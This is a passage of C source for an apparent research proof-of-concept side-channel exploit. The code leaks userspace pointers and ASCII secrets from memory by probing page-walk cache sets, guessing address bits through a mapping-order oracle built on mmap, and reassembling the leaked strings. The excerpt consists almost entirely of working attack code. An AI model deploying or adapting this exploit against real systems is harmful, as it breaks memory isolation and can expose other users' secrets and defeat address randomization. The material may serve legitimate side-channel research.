return_ans:

  // If we don't find a full VPN (including the cache offset) remove
  // additional information to avoid reporting incorrect bits.
  if (ret.num_lines_found < 2) {
    ret.va.vpn4_co = 0;
    ret.va.vpn3_set = 0;
    ret.va.vpn3_co = 0;
  } else if (ret.num_lines_found < 3) {
    ret.va.vpn3_co = 0;
    ret.va.vpn2_set = 0;
    ret.va.vpn2_co = 0;
  } else if (ret.num_lines_found < 4) {
    ret.va.vpn2_co = 0;
    ret.va.vpn1_set = 0;
    ret.va.vpn1_co = 0;
  } else if (ret.num_lines_found < 5) {
    ret.va.vpn1_co = 0;
    ret.va.po_set = 0;
    ret.va.po_co = 0;
  } else {
    flush_and_reload_final_bits(&ret, setup, trigger, addr);
  }

  return ret;
}

struct pwsc_ans leak_userspace_ptr(uint64_t addr, uint64_t *init_noise_filter,
                                   uint64_t expected_vpn4_set) {
  // Leak whatever is mapped (lose the cache offsets here)
  struct pwsc_ans init_profile = leak_pwsc_ptr(addr, init_noise_filter);
  fprintf(stderr,
          "The va found after first pass is %u and the number of lines found "
          "is %lu\n",
          init_profile.va.vpn4_set, init_profile.num_lines_found);
  if (init_profile.va.vpn4_set != expected_vpn4_set)
    fprintf(stderr, "[WARNING] previous line does not match this line\n");
  // You can add more complex handling, for example sometimes things are
  // reordered. I chose to not add more complex handling here and just decide
  // to give up lol. It doesn't seem to have that big of a hit on performance
  // and helps improve speed.

  // Don't attempt to use the mapping order oracle on kernel pointers
  if (init_profile.va.vpn4_set > 31 && init_profile.num_lines_found == 1)
    return init_profile;

  // If we found multiple cache sets (lines) then we either don't know the
  // cache offsets. Then we should return all zeros to not claim to know
  // anything
  if (init_profile.num_lines_found != 1) {
    init_profile.va.va = 0;
    return init_profile;
  }

  // Memory mapping order oracle
  struct pwsc_ans ret = init_profile;
  uint64_t previous_set = ret.va.vpn4_set;
  for (int cur_depth = ret.num_lines_found; cur_depth <= 4; cur_depth++) {
    for (uint8_t co_guess = 0; co_guess < 8; co_guess++) {

      // Fill in guess
      if (cur_depth == 1)
        ret.va.vpn4_co = co_guess;
      else if (cur_depth == 2)
        ret.va.vpn3_co = co_guess;
      else if (cur_depth == 3)
        ret.va.vpn2_co = co_guess;
      else if (cur_depth == 4)
        ret.va.vpn1_co = co_guess;

      // Avoid making the memory mapped region result in the nexet vpn set to
      // be 0 which we have trouble handling
      if (cur_depth <= 1) {
        ret.va.vpn3_set = 32;
        ret.va.vpn3_co = 6;
      }
      if (cur_depth <= 2) {
        ret.va.vpn2_set = 32;
        ret.va.vpn2_co = 6;
      }
      if (cur_depth <= 3) {
        ret.va.vpn1_set = 32;
        ret.va.vpn1_co = 6;
      }

      fprintf(stderr, "We are verifying the guess %lx\n", ret.va.va);

      // Map the guess
      char *va_buffer =
          mmap((void *)ret.va.va, 4096, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE,
               -1, 0);
      if (va_buffer == (void *)-1) {
        fprintf(stderr, "[ERROR] mmap in leak_userspace_ptr failed :(!\n");
        goto return_ans;
      }
      *va_buffer = 0x5A;

      // Check if guess is right
      uint64_t found_line = leak_pwsc_non_cached(addr, init_noise_filter);
      fprintf(stderr, "Found line is %lu\n", found_line);
      munmap((void *)va_buffer, 4096);
      if (found_line != ncache_lines && found_line != previous_set) {
        if (cur_depth == 1)
          ret.va.vpn3_set = found_line;
        else if (cur_depth == 2)
          ret.va.vpn2_set = found_line;
        else if (cur_depth == 3)
          ret.va.vpn1_set = found_line;
        else if (cur_depth == 4)
          ret.va.po_set = found_line;
        ret.num_lines_found++;

        // update previous_set
        previous_set = found_line;
        break;
      } else if (found_line == ncache_lines) {
        // It may the base that the next vpn set is blocked by the noise
        // filter somehow thus no signal tells us that our guess is correct
        // but we can't continue since we don't exactly know the next vpn set.
        goto return_ans;
      }
    }

    // Found nothing
    if (ret.num_lines_found == (uint64_t)cur_depth) {
      fprintf(stderr, "[WARNING] Unable to determine CO and next cache set\n");
      goto return_ans;
    }
  }

return_ans:

  // If we don't find a full VPN (including the cache offset) remove
  // additional information to avoid reporting incorrect bits.
  if (ret.num_lines_found < 2) {
    ret.va.vpn4_co = 0;
    ret.va.vpn3_set = 0;
    ret.va.vpn3_co = 0;
  } else if (ret.num_lines_found < 3) {
    ret.va.vpn3_co = 0;
    ret.va.vpn2_set = 0;
    ret.va.vpn2_co = 0;
  } else if (ret.num_lines_found < 4) {
    ret.va.vpn2_co = 0;
    ret.va.vpn1_set = 0;
    ret.va.vpn1_co = 0;
  } else if (ret.num_lines_found < 5) {
    ret.va.vpn1_co = 0;
    ret.va.po_set = 0;
    ret.va.po_co = 0;
  }

  return ret;
}

struct bit_map *leak_addr_range(uint64_t start_leak, uint64_t end_leak,
                                uint64_t gran, uint64_t *init_noise_filter,
                                uint64_t ascii_flag) {
  if (start_leak == 0) {
    fprintf(stderr, "[ERROR] start_leak can't equal zero or else we will "
                    "integer overflow!\n");
    return NULL;
  }

  // Create bit map (to store leaked bits)
  struct bit_map *ret = create_bit_map(end_leak - start_leak);
  if (!ret) {
    fprintf(stderr, "[ERROR] Unable to allocate a bit map for leakage...\n");
    return NULL;
  }

  // Begin leaking the address range
  int byte_idx = 2;
  uint64_t previous_set = 64;
  for (uint64_t cur_addr = end_leak - 1; cur_addr >= start_leak;
       cur_addr -= gran) {

    // Calculate possible noise from the PO of the secret's address and mask
    // them out with the noise filter. There is additional filtering to
    // account potential prefetching and just to be extra cautious.
    int PO = cur_addr % 4096;
    int PO_set = (PO / 64) % ncache_lines;
    init_noise_filter[PO_set] += 2;
    init_noise_filter[(PO_set + 1) % ncache_lines] += 2;

    // Retrive secret
    struct pwsc_ans ans = {.va = {.va = 0}, .num_lines_found = 0};
    if (ascii_flag)
      ans = leak_ascii_char(cur_addr, init_noise_filter, previous_set);
    else
      ans = leak_userspace_ptr(cur_addr, init_noise_filter, previous_set);

    // In case of larger granularities need additional shifts in the bitmap
    if (cur_addr != end_leak - 1)
      for (uint64_t i = 0; i < gran - 1; i++)
        shift_one_byte(ret);

    // Add found bits to the map
    // This function also does a correctness check with previously found bits
    uint64_t status = add_ptr_to_bit_map(ret, ans.va.va, ans.num_lines_found,
                                         (cur_addr != end_leak - 1));
    // You can add smarter error handling if we find that the previously found
    // bits don't match the found bits.
    (void)status;

    // Output leaked character if in ASCII mode
    if (ascii_flag) {
      fprintf(stderr, "Leaked character: <%c> Value: %d\n",
              (char)ret->bytes[byte_idx], ret->bytes[byte_idx]);
      extract_string(ret);
    }
    byte_idx += gran;

    // Update previous set
    previous_set = VPN4_TO_CACHE_LINE((ans.va.va << 8));

    // Clear advanced noise filter
    init_noise_filter[PO_set] -= 2;
    init_noise_filter[(PO_set + 1) % ncache_lines] -= 2;
  }

  return ret;
}

void extract_string(struct bit_map *map) {
  char string_ans[1024] = {0};
  char *ans = NULL;
  fprintf(stderr, "hexdump: ");

  // We need to flip the endianness of the byte map for strings (big endian to
  // little endian )
  for (int i = 0; i <= map->cur_pos; i++) {
    string_ans[i] = map->bytes[map->cur_pos - i];
    fprintf(stderr, "%02x(%c) ", map->bytes[map->cur_pos - i],
            (char)map->bytes[map->cur_pos - i]);

    // Remove any bad zeros at the front of the bitmap
    if (!ans && string_ans[i] != 0)
      ans = string_ans + i;
  }
  fprintf(stderr, "\n");

  // Output extract string
  fprintf(stderr, "Extracted string <%s>\n", ans);
}

double accuracy(struct bit_map *guess, char *correct) {
  double correct_bits = 0.0;
  double total_bits = (guess->cur_pos - 2) * 8.0;
  for (int64_t i = 2; i < guess->cur_pos; i++)
    for (uint64_t shift = 0; shift < 8; shift++)
      if ((guess->bytes[guess->cur_pos - i] & (1 << shift)) ==
          (correct[i] & (1 << shift)))
        correct_bits += 1.0;

  fprintf(stderr, "Stats: %f/%f\n", correct_bits, total_bits);
  return (correct_bits / total_bits);
}
